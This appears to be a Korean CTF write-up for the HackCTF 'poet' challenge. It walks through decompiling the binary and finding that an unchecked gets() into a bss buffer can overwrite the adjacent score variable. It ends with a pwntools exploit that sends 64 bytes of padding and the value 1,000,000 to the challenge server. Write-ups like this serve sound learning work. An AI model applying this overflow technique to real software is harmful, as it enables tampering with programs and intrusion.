**HackCTF - poet**

| layout | title                         | auther   | categories | tags           |
| ------ | ----------------------------- | -------- | ---------- | -------------- |
| post   | HackCTF - poet | Y3oj4eng | writeup    | writeupwargame |

# Analysis
---

### `file` & `Checksec`


```bash
mac at ubuntu in ~/Desktop/hackCTF
$ file poet 
poet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=65fc088e5fe2995da2cc64236196b75a60dc76f0, not stripped

mac at ubuntu in ~/Desktop/hackCTF
$ checksec poet 
[*] '/home/mac/Desktop/hackCTF/poet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ELF 64-bit 바이너리에 `NX` 미티게이션이 적용되었다.

따라서 스택, 힙, 데이터영역에 실행권한이 제한된다.

바이너리를 실행시켜보도록 한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ ./poet 

**********************************************************
*     우리는 2018년의 시인(poet)을 찾고 있습니다.        *
*  플래그상을 받고 싶다면 지금 한 줄의 시를 쓰세요!      *
**********************************************************

Enter :
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
이 시의 저자는 누구입니까?
> DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD

+---------------------------------------------------------------------------+
시 내용
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
점수:1145324612
```

프로그램의 실행 프로세스는 이전 문제들과는 다소 차이가 있었다.
실행시, 한 줄의 시를 써달라며 입력을 받은 뒤, 시의 저자를 입력해달라고 다시 입력받는다.

이후, **점수**를 출력해준디. 문제에서는 정확히 `1,000,000` 점을 획득해야 한다는 문자열이 출력된다.

해당 부분을 참고한 뒤 `IDA`를 통해 분석을 진행한다.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rdi

  setvbuf(_bss_start, 0LL, 2, 0LL);
  v3 = s;
  puts(s);
  while ( 1 )
  {
    get_poem();
    get_author(v3);
    rate_poem(v3);
    if ( score == 1000000 )
      break;
    v3 = asc_400D78;
    puts(asc_400D78);
  }
  reward(v3);
}
```

`main`함수의 구성이다.
`buf` 설정이후 일련의 문자열을 출력한뒤 `score`값이 `1000000` 이 될 떄 까지 무한루프에 들어간다.

무한루프 내에서는 `get_poem()`과 `get_author()` 그리고 `rate_poem()`함수가 실행된다.

순차적으로 함수들을 살펴보도록 한다.

```c
__int64 get_poem()
{
  __int64 result; // rax

  printf("Enter :\n> ");
  result = gets(poem);
  score = 0;
  return result;
}
```
`get_poem()` 함수는 `gets`를 통해 `poem`에 값을 입력받고 해당 값을 `result`변수에 저장한다.

참고로, `poem`변수는 고정주소의 `bss` 영역에 존재한다.

![image](https://user-images.githubusercontent.com/33051018/76163900-a8e3b600-618d-11ea-9ecd-0a6394acfb6b.png)


다음으로 `get_author()`이다.

```c
__int64 get_author()
{
  printf(&byte_400C38);
  return gets(&unk_6024A0);
}
```
위 함수는 그냥 간단히 문자열 출력 이후 `unk_6024A0`에 값을 입력받는다.

위 그림에서도 볼 수 있듯 해당 값은 `poem` 변수 근방에 위치하고 있다.

```c
int rate_poem()
{
  char dest; // [rsp+0h] [rbp-410h]
  char *s1; // [rsp+408h] [rbp-8h]

  strcpy(&dest, poem);
  for ( s1 = strtok(&dest, " \n"); s1; s1 = strtok(0LL, " \n") )
  {
    if ( !strcmp(s1, "ESPR")
      || !strcmp(s1, "eat")
      || !strcmp(s1, "sleep")
      || !strcmp(s1, "pwn")
      || !strcmp(s1, "repeat")
      || !strcmp(s1, "CTF")
      || !strcmp(s1, "capture")
      || !strcmp(s1, "flag") )
    {
      score += 100;
    }
  }
  return printf(asc_400BC0, poem, (unsigned int)score);
}
```

다음으로 `rate_poem()` 함수이다.

해당 함수는 `get_poem()`에서 값을 입력받았던 `poem`변수의 값을 `dest`로 복사한다.
이후 `strtok`를 통해 단어를 잘라가며 `ESPR, eat, sleep, pwn, repeat, CTF, capture, flag` 중 한 단어가 있을 경우 100점을 더한다.

우리는 1,000,000점을 얻어내야 한다.

`dest` 변수는 `rbp-0x410`에 위치함으로 1040bytes의 길이를 가지며 위 단어 중 가장 짧은 단어인 `eat, pwn, CTF`와 같이 3bytes의 문자들을 이용하여도 우리의 목표인 1,000,000점은 얻어낼 수 없다.

우리는 목표 점수를 얻어내야하지만, 정당한 방식을 통해서는 해당 점수를 얻어내지 못하도록 설계되어있다.

일단은 저 `score`변수의 위치를 확인해보았다.

![image](https://user-images.githubusercontent.com/33051018/76164046-e39a1e00-618e-11ea-917b-acceee876149.png)

다행히도 `score` 변수 또한 고정주소값을 갖는 `bss`영역에 위치하고 있었다.

우리의 목표는 `score`변수를 1,000,000점으로 조작하는 것이다.

`get_poem` 함수에서도 `gets()`를 통해 `bss` 영역에 위치하는 변수에 값을 입력받으나 입력받은 이후 `score=0`으로 초기화하는 코드가 있기 떄문에 해당 부분에서 `score` 값을 조작하는 것은 불가능하다.

`get_poem` 이후, `get_author` 함수가 실행되며 다시 `bss`영역 변수에 `gets()`를 통해 값을 입력받으며 이 부분이 `score` 변수를 조작하기 적절하다.

따라서, 해당 로직을 이용하여 문제를 풀면 점수를 조작할 수 있을것 같다.

![image](https://user-images.githubusercontent.com/33051018/76164940-45aa5180-6196-11ea-8cb1-7db9f5e4755c.png)

두 변 수 사이의 거리는 64bytes 이다.

첫번쨰 입력에서는 아무값이나 입력하고 두번쨰 값을 입력받을떄 페이로드를 전달하도록 한다.

`payload : dummy(64bytes) + 1,000,000`


# Exploit
---

```python
from pwn import *

context.log_level = 'debug'

p = remote('ctf.j0n9hyun.xyz', 3012)

#p = process('./poet')

payload = ''
payload += 'A' * 64
payload += p64(1000000)

# get_poem()
p.recvuntil('> ')
p.sendline('Y3oj4eng')

# get_author()
p.recvuntil('> ')
p.sendline(payload)

p.interactive()

```



